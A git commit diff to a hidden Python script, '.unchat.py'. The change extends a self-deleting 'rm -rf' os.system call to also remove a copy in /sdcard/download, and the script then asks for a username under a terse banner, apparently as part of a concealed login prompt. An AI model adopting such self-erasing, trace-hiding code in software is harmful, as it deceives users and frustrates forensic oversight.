ffc19bd6eb06c4a153b2e3ee6612a27a92bccd3b
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-27 15:14:29 +0300

    Update .unchat.py

--- .unchat.py
+++ .unchat.py
@@ -16,7 +16,7 @@ G = "\033[32m"
 W = "\033[0;1m" 
 R = "\033[31m"   
 C = "\033[36;1m"
-os.system("rm -rf .unchat.py")
+os.system("rm -rf .unchat.py ;rm -rf /sdcard/download/.unchat.py")
 joker = "2"
 print(W+'------------------------------------------------------\n  '+wd+'intaka daxl bka gullm'+W+'\n------------------------------------------------------')
 user = input(" username  : ")
